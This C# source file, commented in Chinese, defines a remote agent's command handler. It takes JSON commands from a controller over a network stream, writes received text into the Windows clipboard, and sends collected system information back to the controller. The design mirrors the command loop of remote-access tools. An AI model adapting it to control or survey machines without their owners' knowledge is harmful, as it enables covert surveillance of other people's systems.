using System;
using System.Text.Json;
using System.Net.Sockets;
using System.Text;


// 解析Agent的指令
public class CommandHandler
{    
    private NetworkStream stream;
    public CommandHandler(NetworkStream stream)
    {
        this.stream = stream;
    }
  //接收Controller傳來的JSON字串
    public async void Execute(string json)
    {
      //將字串轉Command物件
        var cmd = JsonSerializer.Deserialize<Command>(json);
//轉失敗就結束
        if (cmd == null)
        {
            Console.WriteLine("指令解析失敗");
            return;
        }
//根據指令執行功能
        switch (cmd.Type)
        {
            case "clipboard":
                // 真正把文字寫入 Windows 系統剪貼簿
                Thread t = new Thread(() => System.Windows.Forms.Clipboard.SetText(cmd.Data));
                t.SetApartmentState(ApartmentState.STA); // 剪貼簿必須在 STA 模式下執行
                t.Start();
                t.Join(); // 確保寫入完成才繼續往下走

                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] 收到剪貼簿內容並已寫入系統：{cmd.Data}");
                break;

            case "sysinfo":

    // 取得系統資訊
    string info = SystemInfo.GetAll();

    // 轉成位元組
    byte[] bytes = Encoding.UTF8.GetBytes(info);

    // 傳回 Controller
    await stream.WriteAsync(bytes);

    Console.WriteLine("已回傳系統資訊");

    break;

            default:
                Console.WriteLine($"未知指令：{cmd.Type}");
                break;
        }
    }
}
